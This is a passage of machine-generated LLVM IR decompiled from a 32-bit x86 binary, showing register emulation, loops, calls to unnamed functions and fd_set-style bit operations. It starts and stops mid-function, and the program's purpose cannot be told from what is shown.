  %v3_8048a7b = call i32 @function_8051c10(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8048a7b, i32* %eax.global-to-local, align 4
  %v0_8048a80 = load i32, i32* @esp, align 4
  %v1_8048a80 = inttoptr i32 %v0_8048a80 to i32*
  %v2_8048a80 = load i32, i32* %v1_8048a80, align 4
  store i32 %v2_8048a80, i32* %eax.global-to-local, align 4
  %v1_8048a81 = add i32 %v0_8048a80, 10388
  store i32 %v1_8048a81, i32* %ecx.global-to-local, align 4
  store i32 %v1_8048a81, i32* %v1_8048a80, align 4
  %v2_8048a89 = call i32 @function_8051bf0(i8* %v1_8048752)
  store i32 %v2_8048a89, i32* %eax.global-to-local, align 4
  store i32 %v2_8048a89, i32* @ebx, align 4
  %v0_8048a90 = load i32, i32* @esp, align 4
  %v1_8048a90 = inttoptr i32 %v0_8048a90 to i32*
  %v2_8048a90 = load i32, i32* %v1_8048a90, align 4
  store i32 %v2_8048a90, i32* %eax.global-to-local, align 4
  %v1_8048a91 = add i32 %v0_8048a90, 68
  %v2_8048a91 = inttoptr i32 %v1_8048a91 to i32*
  %v3_8048a91 = load i32, i32* %v2_8048a91, align 4
  store i32 %v3_8048a91, i32* %eax.global-to-local, align 4
  store i32 %v3_8048a91, i32* %v1_8048a90, align 4
  %v2_8048a96 = call i32 @function_8051bf0(i8* %v1_8048752)
  store i32 %v2_8048a96, i32* %eax.global-to-local, align 4
  %v0_8048a9b = load i32, i32* @esp, align 4
  %v1_8048a9e = add i32 %v0_8048a9b, 10388
  %v1_8048aa5 = load i32, i32* @ebx, align 4
  %v2_8048aa5 = add i32 %v1_8048a9e, %v1_8048aa5
  %v12_8048aa5 = icmp eq i32 %v2_8048aa5, 0
  store i1 %v12_8048aa5, i1* %zf.global-to-local, align 1
  store i32 %v2_8048aa5, i32* %edx.global-to-local, align 4
  %v2_8048aa7 = add i32 %v0_8048a9b, 8
  %v3_8048aa7 = inttoptr i32 %v2_8048aa7 to i32*
  store i32 %v2_8048aa5, i32* %v3_8048aa7, align 4
  %v1_8048aa8 = add i32 %v0_8048a9b, 4
  %v2_8048aa8 = inttoptr i32 %v1_8048aa8 to i32*
  store i32 10, i32* %v2_8048aa8, align 4
  %v3_8048aaa = inttoptr i32 %v0_8048a9b to i32*
  store i32 %v2_8048a96, i32* %v3_8048aaa, align 4
  %v4_8048aab = call i32 @function_8052000(i64 %v3_8048aab, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_8048aab, i32* %eax.global-to-local, align 4
  %v0_8048ab0 = load i32, i32* @esp, align 4
  %v1_8048ab0 = inttoptr i32 %v0_8048ab0 to i32*
  %v2_8048ab0 = load i32, i32* %v1_8048ab0, align 4
  store i32 %v2_8048ab0, i32* @ebx, align 4
  %v1_8048ab1 = add i32 %v0_8048ab0, 10388
  store i32 %v1_8048ab1, i32* %eax.global-to-local, align 4
  store i32 %v1_8048ab1, i32* %v1_8048ab0, align 4
  %v2_8048ab9 = call i32 @function_8051bf0(i8* %v1_8048752)
  store i32 %v2_8048ab9, i32* %eax.global-to-local, align 4
  %v0_8048abe = load i32, i32* @esp, align 4
  %v1_8048abe = inttoptr i32 %v0_8048abe to i32*
  %v2_8048abe = load i32, i32* %v1_8048abe, align 4
  store i32 %v2_8048abe, i32* %edx.global-to-local, align 4
  %v3_8048abe = add i32 %v0_8048abe, 4
  %v1_8048abf = inttoptr i32 %v3_8048abe to i32*
  %v2_8048abf = load i32, i32* %v1_8048abf, align 4
  store i32 %v2_8048abf, i32* %ecx.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_8054ac6.10 to i32), i32* %v1_8048abf, align 4
  %v1_8048ac5 = add i32 %v0_8048abe, 10388
  store i32 %v1_8048ac5, i32* %edx.global-to-local, align 4
  %v2_8048acc = add i32 %v1_8048ac5, %v2_8048ab9
  store i32 %v2_8048acc, i32* %eax.global-to-local, align 4
  store i32 %v2_8048acc, i32* %v1_8048abe, align 4
  %v3_8048ad0 = call i32 @function_8051c10(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8048ad0, i32* %eax.global-to-local, align 4
  %v0_8048ad5 = load i32, i32* @esp, align 4
  %v1_8048ad5 = add i32 %v0_8048ad5, 16
  %v6_8048ad5 = icmp eq i32 %v1_8048ad5, 0
  store i1 %v6_8048ad5, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_8048ad8

dec_label_pc_8048ad8:                             ; preds = %dec_label_pc_8048700, %dec_label_pc_80489c4
  %v0_8048ae3 = phi i32 [ %v1_80489b5, %dec_label_pc_8048700 ], [ %v1_8048ad5, %dec_label_pc_80489c4 ]
  %v0_8048ad8 = load i32, i32* @esi, align 4
  %v1_8048ad8 = add i32 %v0_8048ad8, 28
  %v2_8048ad8 = inttoptr i32 %v1_8048ad8 to i32*
  %v3_8048ad8 = load i32, i32* %v2_8048ad8, align 4
  store i32 %v3_8048ad8, i32* @ebx, align 4
  %v1_8048adb = icmp eq i32 %v3_8048ad8, 0
  store i1 %v1_8048adb, i1* %zf.global-to-local, align 1
  %tmp139 = icmp slt i32 %v3_8048ad8, 1
  br i1 %tmp139, label %dec_label_pc_8048bb4, label %dec_label_pc_8048ae3

dec_label_pc_8048ae3:                             ; preds = %dec_label_pc_8048ad8
  %v9_8048ae3 = icmp eq i32 %v0_8048ae3, 12
  store i1 %v9_8048ae3, i1* %zf.global-to-local, align 1
  %v1_8048ae6 = add i32 %v0_8048ae3, 10372
  store i32 %v1_8048ae6, i32* %ecx.global-to-local, align 4
  %v2_8048aed = add i32 %v0_8048ae3, -16
  %v3_8048aed = inttoptr i32 %v2_8048aed to i32*
  store i32 %v1_8048ae6, i32* %v3_8048aed, align 4
  %v2_8048aee = call i32 @function_8051bf0(i8* %v1_8048752)
  store i32 %v2_8048aee, i32* %eax.global-to-local, align 4
  %v0_8048af3 = load i32, i32* @esp, align 4
  %v1_8048af3 = inttoptr i32 %v0_8048af3 to i32*
  %v2_8048af3 = load i32, i32* %v1_8048af3, align 4
  store i32 %v2_8048af3, i32* %edx.global-to-local, align 4
  %v3_8048af3 = add i32 %v0_8048af3, 4
  %v1_8048af4 = inttoptr i32 %v3_8048af3 to i32*
  %v2_8048af4 = load i32, i32* %v1_8048af4, align 4
  store i32 %v2_8048af4, i32* %ecx.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_8054ab8.11 to i32), i32* %v1_8048af4, align 4
  %v1_8048afa = add i32 %v0_8048af3, 10388
  store i32 %v1_8048afa, i32* %edx.global-to-local, align 4
  %v2_8048b01 = add i32 %v1_8048afa, %v2_8048aee
  store i32 %v2_8048b01, i32* %eax.global-to-local, align 4
  store i32 %v2_8048b01, i32* %v1_8048af3, align 4
  %v3_8048b05 = call i32 @function_8051c10(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8048b05, i32* %eax.global-to-local, align 4
  %v0_8048b0a = load i32, i32* @esp, align 4
  %v1_8048b0a = add i32 %v0_8048b0a, 20916
  %v2_8048b0a = inttoptr i32 %v1_8048b0a to i32*
  store i32 0, i32* %v2_8048b0a, align 4
  %v0_8048b15 = load i32, i32* @esp, align 4
  %v1_8048b15 = add i32 %v0_8048b15, 16
  %v0_8048b18 = load i32, i32* @esi, align 4
  %v1_8048b18 = add i32 %v0_8048b18, 28
  %v2_8048b18 = inttoptr i32 %v1_8048b18 to i32*
  %v3_8048b18 = load i32, i32* %v2_8048b18, align 4
  store i32 %v3_8048b18, i32* %ebx.global-to-local, align 4
  %v1_8048b1b = icmp eq i32 %v3_8048b18, 0
  store i1 %v1_8048b1b, i1* %zf.global-to-local, align 1
  %tmp140 = icmp slt i32 %v3_8048b18, 1
  br i1 %tmp140, label %dec_label_pc_8048b8a, label %dec_label_pc_8048b1f

dec_label_pc_8048b1f:                             ; preds = %dec_label_pc_8048ae3
  store i1 true, i1* %zf.global-to-local, align 1
  store i32 0, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8048b21

dec_label_pc_8048b21:                             ; preds = %dec_label_pc_8048b21, %dec_label_pc_8048b1f
  %v0_8048b24 = phi i32 [ %v1_8048b82, %dec_label_pc_8048b21 ], [ %v1_8048b15, %dec_label_pc_8048b1f ]
  %v0_8048b21 = phi i32 [ %v4_8048b85, %dec_label_pc_8048b21 ], [ 0, %dec_label_pc_8048b1f ]
  %v2_8048b21 = mul i32 %v0_8048b21, 128
  store i32 %v2_8048b21, i32* @ebx, align 4
  %v9_8048b24 = icmp eq i32 %v0_8048b24, 12
  store i1 %v9_8048b24, i1* %zf.global-to-local, align 1
  %v1_8048b27 = add i32 %v0_8048b24, 10372
  store i32 %v1_8048b27, i32* %ecx.global-to-local, align 4
  %v2_8048b2e = add i32 %v0_8048b24, -16
  %v3_8048b2e = inttoptr i32 %v2_8048b2e to i32*
  store i32 %v1_8048b27, i32* %v3_8048b2e, align 4
  %v2_8048b2f = call i32 @function_8051bf0(i8* %v1_8048752)
  store i32 %v2_8048b2f, i32* %eax.global-to-local, align 4
  %v0_8048b34 = load i32, i32* @esp, align 4
  %v1_8048b34 = inttoptr i32 %v0_8048b34 to i32*
  %v3_8048b34 = add i32 %v0_8048b34, 4
  %v0_8048b35 = load i32, i32* @ebx, align 4
  %v1_8048b35 = load i32, i32* @edi, align 4
  %v2_8048b35 = add i32 %v0_8048b35, 1472
  %v3_8048b35 = add i32 %v2_8048b35, %v1_8048b35
  store i32 %v3_8048b35, i32* %edx.global-to-local, align 4
  %v1_8048b3c = inttoptr i32 %v3_8048b34 to i32*
  %v2_8048b3c = load i32, i32* %v1_8048b3c, align 4
  store i32 %v2_8048b3c, i32* %ecx.global-to-local, align 4
  store i32 %v3_8048b35, i32* %v1_8048b3c, align 4
  %v1_8048b3e = add i32 %v0_8048b34, 10388
  store i32 %v1_8048b3e, i32* %edx.global-to-local, align 4
  %v2_8048b45 = add i32 %v1_8048b3e, %v2_8048b2f
  store i32 %v2_8048b45, i32* %eax.global-to-local, align 4
  store i32 %v2_8048b45, i32* %v1_8048b34, align 4
  %v3_8048b49 = call i32 @function_8051c10(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8048b49, i32* %eax.global-to-local, align 4
  %v0_8048b4e = load i32, i32* @esp, align 4
  %v1_8048b4e = inttoptr i32 %v0_8048b4e to i32*
  %v2_8048b4e = load i32, i32* %v1_8048b4e, align 4
  store i32 %v2_8048b4e, i32* @ebx, align 4
  %v1_8048b4f = add i32 %v0_8048b4e, 10388
  store i32 %v1_8048b4f, i32* %ecx.global-to-local, align 4
  store i32 %v1_8048b4f, i32* %v1_8048b4e, align 4
  %v2_8048b57 = call i32 @function_8051bf0(i8* %v1_8048752)
  store i32 %v2_8048b57, i32* %eax.global-to-local, align 4
  %v0_8048b5c = load i32, i32* @esp, align 4
  %v1_8048b5c = inttoptr i32 %v0_8048b5c to i32*
  %v2_8048b5c = load i32, i32* %v1_8048b5c, align 4
  store i32 %v2_8048b5c, i32* %edx.global-to-local, align 4
  %v3_8048b5c = add i32 %v0_8048b5c, 4
  %v1_8048b5d = inttoptr i32 %v3_8048b5c to i32*
  %v2_8048b5d = load i32, i32* %v1_8048b5d, align 4
  store i32 %v2_8048b5d, i32* %ecx.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_8054ac1.12 to i32), i32* %v1_8048b5d, align 4
  %v1_8048b63 = add i32 %v0_8048b5c, 10388
  store i32 %v1_8048b63, i32* %edx.global-to-local, align 4
  %v2_8048b6a = add i32 %v1_8048b63, %v2_8048b57
  store i32 %v2_8048b6a, i32* %eax.global-to-local, align 4
  store i32 %v2_8048b6a, i32* %v1_8048b5c, align 4
  %v3_8048b6e = call i32 @function_8051c10(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8048b6e, i32* %eax.global-to-local, align 4
  %v0_8048b73 = load i32, i32* @esp, align 4
  %v1_8048b73 = add i32 %v0_8048b73, 20916
  %v2_8048b73 = inttoptr i32 %v1_8048b73 to i32*
  %v3_8048b73 = load i32, i32* %v2_8048b73, align 4
  %v1_8048b7a = add i32 %v3_8048b73, 1
  store i32 %v1_8048b7a, i32* %ebx.global-to-local, align 4
  store i32 %v1_8048b7a, i32* %v2_8048b73, align 4
  %v0_8048b82 = load i32, i32* @esp, align 4
  %v1_8048b82 = add i32 %v0_8048b82, 16
  %v0_8048b85 = load i32, i32* @esi, align 4
  %v1_8048b85 = add i32 %v0_8048b85, 28
  %v2_8048b85 = inttoptr i32 %v1_8048b85 to i32*
  %v3_8048b85 = load i32, i32* %v2_8048b85, align 4
  %v4_8048b85 = load i32, i32* %ebx.global-to-local, align 4
  %v5_8048b85 = sub i32 %v3_8048b85, %v4_8048b85
  %v11_8048b85 = xor i32 %v4_8048b85, %v3_8048b85
  %v12_8048b85 = xor i32 %v5_8048b85, %v3_8048b85
  %v13_8048b85 = and i32 %v12_8048b85, %v11_8048b85
  %v14_8048b85 = icmp slt i32 %v13_8048b85, 0
  %v15_8048b85 = icmp eq i32 %v5_8048b85, 0
  store i1 %v15_8048b85, i1* %zf.global-to-local, align 1
  %v16_8048b85 = icmp slt i32 %v5_8048b85, 0
  %v3_8048b88 = icmp eq i1 %v16_8048b85, %v14_8048b85
  %v4_8048b88 = icmp eq i1 %v15_8048b85, false
  %v5_8048b88 = and i1 %v4_8048b88, %v3_8048b88
  br i1 %v5_8048b88, label %dec_label_pc_8048b21, label %dec_label_pc_8048b8a

dec_label_pc_8048b8a:                             ; preds = %dec_label_pc_8048b21, %dec_label_pc_8048ae3
  %v0_8048b8a = phi i32 [ %v1_8048b15, %dec_label_pc_8048ae3 ], [ %v1_8048b82, %dec_label_pc_8048b21 ]
  %v9_8048b8a = icmp eq i32 %v0_8048b8a, 12
  store i1 %v9_8048b8a, i1* %zf.global-to-local, align 1
  %v1_8048b8d = add i32 %v0_8048b8a, 10372
  store i32 %v1_8048b8d, i32* %ecx.global-to-local, align 4
  %v2_8048b94 = add i32 %v0_8048b8a, -16
  %v3_8048b94 = inttoptr i32 %v2_8048b94 to i32*
  store i32 %v1_8048b8d, i32* %v3_8048b94, align 4
  %v2_8048b95 = call i32 @function_8051bf0(i8* %v1_8048752)
  store i32 %v2_8048b95, i32* %eax.global-to-local, align 4
  %v0_8048b9a = load i32, i32* @esp, align 4
  %v1_8048b9a = inttoptr i32 %v0_8048b9a to i32*
  %v2_8048b9a = load i32, i32* %v1_8048b9a, align 4
  store i32 %v2_8048b9a, i32* @ebx, align 4
  %v3_8048b9a = add i32 %v0_8048b9a, 4
  %v1_8048b9b = inttoptr i32 %v3_8048b9a to i32*
  %v2_8048b9b = load i32, i32* %v1_8048b9b, align 4
  store i32 %v2_8048b9b, i32* %edi.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_8054ac6.10 to i32), i32* %v1_8048b9b, align 4
  %v1_8048ba1 = add i32 %v0_8048b9a, 10388
  store i32 %v1_8048ba1, i32* %edx.global-to-local, align 4
  %v2_8048ba8 = add i32 %v1_8048ba1, %v2_8048b95
  store i32 %v2_8048ba8, i32* %eax.global-to-local, align 4
  store i32 %v2_8048ba8, i32* %v1_8048b9a, align 4
  %v3_8048bac = call i32 @function_8051c10(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8048bac, i32* %eax.global-to-local, align 4
  %v0_8048bb1 = load i32, i32* @esp, align 4
  %v1_8048bb1 = add i32 %v0_8048bb1, 16
  %v6_8048bb1 = icmp eq i32 %v1_8048bb1, 0
  store i1 %v6_8048bb1, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_8048bb4

dec_label_pc_8048bb4:                             ; preds = %dec_label_pc_8048ad8, %dec_label_pc_8048b8a
  %v0_8048bb4 = phi i32 [ %v0_8048ae3, %dec_label_pc_8048ad8 ], [ %v1_8048bb1, %dec_label_pc_8048b8a ]
  %v9_8048bb4 = icmp eq i32 %v0_8048bb4, 12
  store i1 %v9_8048bb4, i1* %zf.global-to-local, align 1
  %v1_8048bb7 = add i32 %v0_8048bb4, 10372
  store i32 %v1_8048bb7, i32* %ecx.global-to-local, align 4
  %v2_8048bbe = add i32 %v0_8048bb4, -16
  %v3_8048bbe = inttoptr i32 %v2_8048bbe to i32*
  store i32 %v1_8048bb7, i32* %v3_8048bbe, align 4
  %v2_8048bbf = call i32 @function_8051bf0(i8* %v1_8048752)
  store i32 %v2_8048bbf, i32* %eax.global-to-local, align 4
  %v0_8048bc4 = load i32, i32* @esp, align 4
  %v1_8048bc4 = inttoptr i32 %v0_8048bc4 to i32*
  %v2_8048bc4 = load i32, i32* %v1_8048bc4, align 4
  store i32 %v2_8048bc4, i32* %edx.global-to-local, align 4
  %v3_8048bc4 = add i32 %v0_8048bc4, 4
  %v1_8048bc5 = inttoptr i32 %v3_8048bc4 to i32*
  %v2_8048bc5 = load i32, i32* %v1_8048bc5, align 4
  store i32 %v2_8048bc5, i32* %ecx.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_8054ac6.10 to i32), i32* %v1_8048bc5, align 4
  %v1_8048bcb = add i32 %v0_8048bc4, 10388
  store i32 %v1_8048bcb, i32* %edx.global-to-local, align 4
  %v2_8048bd2 = add i32 %v1_8048bcb, %v2_8048bbf
  store i32 %v2_8048bd2, i32* %eax.global-to-local, align 4
  store i32 %v2_8048bd2, i32* %v1_8048bc4, align 4
  %v3_8048bd6 = call i32 @function_8051c10(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8048bd6, i32* %eax.global-to-local, align 4
  %v0_8048bdb = load i32, i32* @esp, align 4
  %v1_8048bdb = add i32 %v0_8048bdb, 16
  %v1_8048bde = add i32 %v0_8048bdb, 68
  %v2_8048bde = inttoptr i32 %v1_8048bde to i32*
  %v3_8048bde = load i32, i32* %v2_8048bde, align 4
  store i32 %v3_8048bde, i32* @edi, align 4
  %v1_8048be2 = icmp eq i32 %v3_8048bde, 0
  store i1 %v1_8048be2, i1* %zf.global-to-local, align 1
  br i1 %v1_8048be2, label %dec_label_pc_8048c10, label %dec_label_pc_8048be6

dec_label_pc_8048be6:                             ; preds = %dec_label_pc_8048bb4
  %v9_8048be6 = icmp eq i32 %v0_8048bdb, -4
  store i1 %v9_8048be6, i1* %zf.global-to-local, align 1
  %v1_8048be9 = add i32 %v0_8048bdb, 10388
  store i32 %v1_8048be9, i32* %ecx.global-to-local, align 4
  %v3_8048bf0 = inttoptr i32 %v0_8048bdb to i32*
  store i32 %v1_8048be9, i32* %v3_8048bf0, align 4
  %v2_8048bf1 = call i32 @function_8051bf0(i8* %v1_8048752)
  store i32 %v2_8048bf1, i32* %eax.global-to-local, align 4
  %v0_8048bf6 = load i32, i32* @esp, align 4
  %v1_8048bf6 = inttoptr i32 %v0_8048bf6 to i32*
  %v2_8048bf6 = load i32, i32* %v1_8048bf6, align 4
  store i32 %v2_8048bf6, i32* %ecx.global-to-local, align 4
  %v3_8048bf6 = add i32 %v0_8048bf6, 4
  %v1_8048bf7 = inttoptr i32 %v3_8048bf6 to i32*
  %v2_8048bf7 = load i32, i32* %v1_8048bf7, align 4
  store i32 %v2_8048bf7, i32* @ebx, align 4
  %v1_8048bf8 = add i32 %v0_8048bf6, 68
  %v2_8048bf8 = inttoptr i32 %v1_8048bf8 to i32*
  %v3_8048bf8 = load i32, i32* %v2_8048bf8, align 4
  store i32 %v3_8048bf8, i32* %v1_8048bf7, align 4
  %v1_8048bfd = add i32 %v0_8048bf6, 10388
  store i32 %v1_8048bfd, i32* %edx.global-to-local, align 4
  %v2_8048c04 = add i32 %v1_8048bfd, %v2_8048bf1
  store i32 %v2_8048c04, i32* %eax.global-to-local, align 4
  store i32 %v2_8048c04, i32* %v1_8048bf6, align 4
  %v3_8048c08 = call i32 @function_8051c10(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8048c08, i32* %eax.global-to-local, align 4
  %v0_8048c0d = load i32, i32* @esp, align 4
  %v1_8048c0d = add i32 %v0_8048c0d, 16
  %v6_8048c0d = icmp eq i32 %v1_8048c0d, 0
  store i1 %v6_8048c0d, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_8048c10

dec_label_pc_8048c10:                             ; preds = %dec_label_pc_8048bb4, %dec_label_pc_8048be6
  %v1_8048c10 = phi i32 [ %v1_8048bdb, %dec_label_pc_8048bb4 ], [ %v1_8048c0d, %dec_label_pc_8048be6 ]
  %v0_8048c10 = phi i32 [ %v3_8048bd6, %dec_label_pc_8048bb4 ], [ %v3_8048c08, %dec_label_pc_8048be6 ]
  %v2_8048c10 = add i32 %v1_8048c10, -4
  %v3_8048c10 = inttoptr i32 %v2_8048c10 to i32*
  store i32 %v0_8048c10, i32* %v3_8048c10, align 4
  %v0_8048c11 = load i32, i32* %eax.global-to-local, align 4
  %v2_8048c11 = add i32 %v1_8048c10, -8
  %v3_8048c11 = inttoptr i32 %v2_8048c11 to i32*
  store i32 %v0_8048c11, i32* %v3_8048c11, align 4
  %v0_8048c12 = load i32, i32* @esi, align 4
  %v2_8048c12 = add i32 %v1_8048c10, -12
  %v3_8048c12 = inttoptr i32 %v2_8048c12 to i32*
  store i32 %v0_8048c12, i32* %v3_8048c12, align 4
  %v1_8048c13 = add i32 %v1_8048c10, 96
  %v2_8048c13 = inttoptr i32 %v1_8048c13 to i32*
  %v3_8048c13 = load i32, i32* %v2_8048c13, align 4
  store i32 %v3_8048c13, i32* %eax.global-to-local, align 4
  %v2_8048c17 = add i32 %v1_8048c10, -16
  %v3_8048c17 = inttoptr i32 %v2_8048c17 to i32*
  store i32 %v3_8048c13, i32* %v3_8048c17, align 4
  %v0_8048c18 = call i32 @function_8051f60()
  store i32 %v0_8048c18, i32* %eax.global-to-local, align 4
  %v0_8048c1d = load i32, i32* @esp, align 4
  %v1_8048c1d = add i32 %v0_8048c1d, 16
  %v3_8048c20 = trunc i32 %v0_8048c18 to i8
  %v4_8048c20 = icmp eq i8 %v3_8048c20, 0
  store i1 %v4_8048c20, i1* %zf.global-to-local, align 1
  br i1 %v4_8048c20, label %dec_label_pc_804979e, label %dec_label_pc_8048c28

dec_label_pc_8048c28:                             ; preds = %dec_label_pc_8048c10, %dec_label_pc_804979e
  %v0_8048c28 = phi i32 [ %v1_8048c1d, %dec_label_pc_8048c10 ], [ %v1_80497ab, %dec_label_pc_804979e ]
  %v9_8048c28 = icmp eq i32 %v0_8048c28, 12
  store i1 %v9_8048c28, i1* %zf.global-to-local, align 1
  %v1_8048c2b = add i32 %v0_8048c28, 10372
  store i32 %v1_8048c2b, i32* %ecx.global-to-local, align 4
  %v2_8048c32 = add i32 %v0_8048c28, -16
  %v3_8048c32 = inttoptr i32 %v2_8048c32 to i32*
  store i32 %v1_8048c2b, i32* %v3_8048c32, align 4
  %v2_8048c33 = call i32 @function_8051bf0(i8* %v1_8048752)
  %v0_8048c38 = load i32, i32* @esp, align 4
  %v1_8048c38 = add i32 %v0_8048c38, -4
  %v2_8048c38 = inttoptr i32 %v1_8048c38 to i32*
  store i32 16384, i32* %v2_8048c38, align 4
  %v2_8048c3d = add i32 %v0_8048c38, -8
  %v3_8048c3d = inttoptr i32 %v2_8048c3d to i32*
  store i32 %v2_8048c33, i32* %v3_8048c3d, align 4
  %v1_8048c3e = add i32 %v0_8048c38, 10388
  store i32 %v1_8048c3e, i32* %eax.global-to-local, align 4
  %v2_8048c45 = add i32 %v0_8048c38, -12
  %v3_8048c45 = inttoptr i32 %v2_8048c45 to i32*
  store i32 %v1_8048c3e, i32* %v3_8048c45, align 4
  %v0_8048c46 = load i32, i32* @esi, align 4
  %v1_8048c46 = add i32 %v0_8048c46, -1440
  %v2_8048c46 = inttoptr i32 %v1_8048c46 to i32*
  %v3_8048c46 = load i32, i32* %v2_8048c46, align 4
  store i32 %v3_8048c46, i32* %ecx.global-to-local, align 4
  %v2_8048c4c = add i32 %v0_8048c38, -16
  %v3_8048c4c = inttoptr i32 %v2_8048c4c to i32*
  store i32 %v3_8048c46, i32* %v3_8048c4c, align 4
  %v0_8048c4d = call i32 @function_80528d4()
  store i32 %v0_8048c4d, i32* %eax.global-to-local, align 4
  %v0_8048c52 = load i32, i32* @esp, align 4
  %v1_8048c52 = add i32 %v0_8048c52, 112
  %v2_8048c52 = inttoptr i32 %v1_8048c52 to i32*
  %v3_8048c52 = load i32, i32* %v2_8048c52, align 4
  store i32 %v3_8048c52, i32* %edx.global-to-local, align 4
  %v0_8048c56 = load i32, i32* @esi, align 4
  %v1_8048c56 = add i32 %v0_8048c56, -1440
  %v2_8048c56 = inttoptr i32 %v1_8048c56 to i32*
  %v3_8048c56 = load i32, i32* %v2_8048c56, align 4
  store i32 %v3_8048c56, i32* %eax.global-to-local, align 4
  %v2_8048c5c = add i32 %v0_8048c56, -1428
  %v3_8048c5c = inttoptr i32 %v2_8048c5c to i32*
  store i32 %v3_8048c52, i32* %v3_8048c5c, align 4
  %v0_8048c62 = load i32, i32* %eax.global-to-local, align 4
  store i32 %v0_8048c62, i32* %edx.global-to-local, align 4
  %v0_8048c64 = load i32, i32* @esi, align 4
  %v1_8048c64 = add i32 %v0_8048c64, -1436
  %v2_8048c64 = inttoptr i32 %v1_8048c64 to i8*
  store i8 6, i8* %v2_8048c64, align 1
  %v0_8048c6b = load i32, i32* %eax.global-to-local, align 4
  %v1_8048c6b = urem i32 %v0_8048c6b, 32
  store i32 %v1_8048c6b, i32* %eax.global-to-local, align 4
  %v0_8048c6e = load i32, i32* %edx.global-to-local, align 4
  %v2_8048c6e = udiv i32 %v0_8048c6e, 32
  store i32 %v2_8048c6e, i32* %edx.global-to-local, align 4
  %v0_8048c71 = load i32, i32* @esp, align 4
  %v2_8048c71 = mul nuw nsw i32 %v2_8048c6e, 4
  %v3_8048c71 = add nuw nsw i32 %v2_8048c71, 20772
  %v4_8048c71 = add i32 %v3_8048c71, %v0_8048c71
  %v5_8048c71 = inttoptr i32 %v4_8048c71 to i32*
  %v6_8048c71 = load i32, i32* %v5_8048c71, align 4
  %v9_8048c71 = shl i32 1, %v1_8048c6b
  %v12_8048c71 = or i32 %v6_8048c71, %v9_8048c71
  %v16_8048c71 = add i32 %v0_8048c71, 20772
  %v17_8048c71 = add i32 %v16_8048c71, %v2_8048c71
  %v18_8048c71 = inttoptr i32 %v17_8048c71 to i32*
  store i32 %v12_8048c71, i32* %v18_8048c71, align 4
  %v0_8048c79 = load i32, i32* @esp, align 4
  %v1_8048c79 = add i32 %v0_8048c79, 32
  %v0_8048c7c = load i32, i32* @esi, align 4
  %v1_8048c7c = add i32 %v0_8048c7c, -1440
  %v2_8048c7c = inttoptr i32 %v1_8048c7c to i32*
  %v3_8048c7c = load i32, i32* %v2_8048c7c, align 4
  store i32 %v3_8048c7c, i32* %eax.global-to-local, align 4
  %v1_8048c82 = add i32 %v0_8048c79, 104
  %v2_8048c82 = inttoptr i32 %v1_8048c82 to i32*
  %v3_8048c82 = load i32, i32* %v2_8048c82, align 4
  %v5_8048c82 = sub i32 %v3_8048c82, %v3_8048c7c
  %v11_8048c82 = xor i32 %v3_8048c82, %v3_8048c7c
  %v12_8048c82 = xor i32 %v5_8048c82, %v3_8048c82
  %v13_8048c82 = and i32 %v12_8048c82, %v11_8048c82
  %v14_8048c82 = icmp slt i32 %v13_8048c82, 0
  %v15_8048c82 = icmp eq i32 %v5_8048c82, 0
  store i1 %v15_8048c82, i1* %zf.global-to-local, align 1
  %v16_8048c82 = icmp slt i32 %v5_8048c82, 0
  %v2_8048c86 = icmp eq i1 %v16_8048c82, %v14_8048c82
  br i1 %v2_8048c86, label %dec_label_pc_8048582, label %dec_label_pc_80486e4

dec_label_pc_8048c91:                             ; preds = %dec_label_pc_80486ee
  store i8 0, i8* %v2_80485a5, align 1
  br label %dec_label_pc_80485be

dec_label_pc_8048c9d:                             ; preds = %dec_label_pc_8048537
  %v0_8048c9d = load i32, i32* @esp, align 4
  %v1_8048c9d = add i32 %v0_8048c9d, 80
  %v2_8048c9d = inttoptr i32 %v1_8048c9d to i32*
  %v3_8048c9d = load i32, i32* %v2_8048c9d, align 4
  store i32 %v3_8048c9d, i32* %eax.global-to-local, align 4
  %v1_8048ca1 = add i32 %v0_80485a5, -1432
  %v2_8048ca1 = inttoptr i32 %v1_8048ca1 to i32*
  %v3_8048ca1 = load i32, i32* %v2_8048ca1, align 4
  store i32 %v3_8048ca1, i32* @ebx, align 4
  %v2_8048ca7 = sub i32 %v3_8048c9d, %v3_8048ca1
  store i32 %v2_8048ca7, i32* %eax.global-to-local, align 4
  %v9_8048ca9 = icmp eq i32 %v2_8048ca7, 30
  store i1 %v9_8048ca9, i1* %zf.global-to-local, align 1
  %tmp239 = icmp ult i32 %v2_8048ca7, 31
  br i1 %tmp239, label %dec_label_pc_8048cb2, label %dec_label_pc_804855f

dec_label_pc_8048cb2:                             ; preds = %dec_label_pc_8048c9d
  %v1_8048cb2 = add i32 %v0_80485a5, -1440
  %v2_8048cb2 = inttoptr i32 %v1_8048cb2 to i32*
  %v3_8048cb2 = load i32, i32* %v2_8048cb2, align 4
  %v1_8048cba = urem i32 %v3_8048cb2, 32
  store i32 %v1_8048cba, i32* %eax.global-to-local, align 4
  %v2_8048cbd = udiv i32 %v3_8048cb2, 32
  store i32 %v2_8048cbd, i32* %edx.global-to-local, align 4
  %v2_8048cc0 = mul nuw nsw i32 %v2_8048cbd, 4
  %v3_8048cc0 = add i32 %v0_8048c9d, 20612
  %v4_8048cc0 = add i32 %v3_8048cc0, %v2_8048cc0
  %v5_8048cc0 = inttoptr i32 %v4_8048cc0 to i32*
  %v6_8048cc0 = load i32, i32* %v5_8048cc0, align 4
